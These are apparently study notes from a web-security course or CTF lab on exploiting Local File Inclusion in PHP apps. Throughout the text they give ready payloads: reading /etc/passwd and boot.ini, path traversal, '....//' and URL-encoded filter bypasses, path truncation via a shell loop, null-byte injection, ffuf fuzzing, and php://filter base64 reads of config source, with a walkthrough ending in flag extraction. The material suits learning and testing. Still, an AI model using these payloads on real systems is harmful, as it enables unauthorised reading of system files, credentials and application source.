- Example given
	- URL is `http://server_ip:port/index.php?language=es.php
	- Change es.php to `/etc/passwd`
		- 2 common readable files available on most back end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows
		- `http://server_ip:port/index.php?language=/etc/passwd

## Path traversal
- Just now we read file by specifying absolute path (`/etc/passwd`)
	- This works if whole input used within `include()` function with not additions
	- Code is `include($_GET['language']);`
	- But if code is `include("./languages/" . $_GET['language']);`
		- Then this doesnt work anymore, since the path would then be `./languages//etc/passwd`
			- Solve with relative paths like `../../../../etc/passwd`

## Filename Prefix
- If code is `include("lang_" . $_GET['language']);`, ie. the full filename is only discovered when appended with prefix
	- Then the previous method would give `lang_../../../etc/passwd` which doesnt work
	- So do `/../../etc/passwd` so this final one is `lang_/../../../etc/passwd
		- This doesn't always work since directory named `lang_` may not even exist

## Appended Extensions
- Code is `include($_GET['language'] . ".php");`
	- If we try to read `/etc/passwd`, then file included would be `/etc/passwd.php` which does not exist
	- See bypass below

# Bypasses
- Non Recursive Path Traversal Filters
	- If the code tries to remove `../` but isn't recursive,
		- `$language = str_replace('../', '', $_GET['language']);
	- We can just put `....//....//etc/passwd`
- Encoding
	- Some web filters may prevent input filters that include characters like `.` or `/`
	- Encode `../` into `%2e%2e%2f` (can do in Burp Suite Decoder)
- Approved paths
	- Some apps may use RegEx to ensure the file being included is under a specific path
	- To find approved path, can **examine requests sent by existing forms**, and see what path they use for **normal** web functionality (see below for example)
	- Can also fuzz web directories under the same path and try different ones until get match
	- Then use path traversal and start payload with approved path
		- eg. `..../index.php?language=./lanuages/../../../etc/passwd`
- Appended extensions
	- These bypasses only work with older versions, PHP before 5.3/4
	- Path truncation
		- Make string longer than 4096 character limit, so the appended extension (`.php`) is truncated
		- Note that we need to start the path witha  non existing dictionary
		- `?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]`
		- Can automate with 
	```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
	```
		-n means don't include newline at the end
	- Null byte injecbuttion
		- ` /index.php?language=../../../../etc/passwd%00`
			- String terminated

Tips from example
- Start with basic `../../etc/passwd` -> Illegal file path, ie approved path bypass
- Default it `language=languages/en.php` -> Try to get back here
	- Try `language=languages/../languages/en.php` -> Doesn't work, so has some encoding bypass
	- Then try different things until it works, eventually get
	- `index.php?language=languages/....//languages/en.php`
		- to identify the encoding bypass
	- Then finally `language=languages/....//....//....//....//....//flag.txt` or whatever since we've identified the other bypass


# PHP Filters
- Idea: read PHP source code and later get RCE using PHP wrappers and filters
- In PHP applications, `include()` executes PHP files instead of displaying them
- Input Filters
	- `php://filter` allows form to be transformed before PHP processes it
		- `php://filter/read=FILTER/resource=FILE`
	- 
	- Generally if try to include php files through LFI, it gets executed and rendered
		- But we weant to read the source code through LFI
			- base64 php filter
			- So instead of `config.php`, we include `php://filter/read=convert.base64-encode/resource=config`

Steps
- First fuzz for available PHP pages
	- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`
	- Not just HTTP 200, include codes like 301 302 403 since we have LFI access and can read source code as well
- Then apply the filter and get the file
	- `?language=php://filter/read=convert.base64-encode/resource=config`
- Take the output string and decode it
	- `echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`